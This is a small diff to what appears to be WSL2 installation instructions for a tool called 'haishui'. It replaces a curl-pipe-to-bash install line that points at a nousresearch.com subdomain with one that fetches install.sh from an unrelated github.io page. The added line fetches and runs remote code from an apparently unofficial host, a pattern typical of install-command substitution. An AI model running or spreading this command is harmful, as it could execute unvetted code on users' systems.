@@ -100,7 +100,7 @@ The `metadata` mount option above is important — without it, files on `/mnt/c/
 Once you have a WSL2 shell open:
 
 ```bash
-curl -fsSL https://haishui-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://aiqinghaiwork163.github.io/haishui-agent/install.sh | bash
 source ~/.bashrc
 haishui
 ```
